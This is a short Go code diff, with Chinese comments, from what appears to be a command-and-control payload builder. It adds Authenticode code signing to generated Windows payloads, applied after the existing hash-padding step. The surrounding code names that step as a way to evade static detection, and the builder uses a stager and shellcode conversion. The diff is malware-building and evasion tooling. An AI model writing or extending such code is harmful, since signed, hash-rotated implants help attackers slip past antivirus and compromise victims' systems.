@@ -4,6 +4,7 @@ import (
 	"BackendTemplate/pkg/database"
 	"BackendTemplate/pkg/encrypt"
 	"BackendTemplate/pkg/godonut"
+	"BackendTemplate/pkg/signing"
 	"BackendTemplate/pkg/stager"
 	"BackendTemplate/pkg/utils/logx"
 	"bytes"
@@ -50,6 +51,8 @@ type PatchOptions struct {
 	Daemonize       string // "1"=Linux TTY 前台运行自动守护化释放终端（默认开）
 	// 二进制 Hash 轮换：追加随机填充（改变每份载荷 hash，规避静态标记）
 	HashPad bool
+	// Sign 生成后做 Authenticode 签名（仅 Windows PE；由 config.signing 决定是否真的签）
+	Sign bool
 	// Format 载荷格式(exe/raw/dll/bin/hex/c)；shellcode 格式长度敏感不追加 pad
 	Format string
 	// OPSEC 编译期配置（可选，空值用客户端默认）
@@ -346,6 +349,16 @@ func PatchClientBinary(binaryData []byte, opt PatchOptions) ([]byte, error) {
 	if opt.HashPad && !shellcodeFmt {
 		data = randomizeGoBuildID(data)
 		data = appendHashPadding(data)
+	}
+
+	// 代码签名必须在所有 patch/pad 之后 —— 签名覆盖最终字节，签完再改就失效。
+	// 未启用时 signing.Sign 原样返回；启用但失败则让载荷生成失败（不静默发未签名文件）。
+	if opt.Sign && strings.EqualFold(opt.OS, "windows") && !shellcodeFmt {
+		signed, serr := signing.Sign(data)
+		if serr != nil {
+			return nil, fmt.Errorf("代码签名失败: %w", serr)
+		}
+		data = signed
 	}
 
 	return data, nil
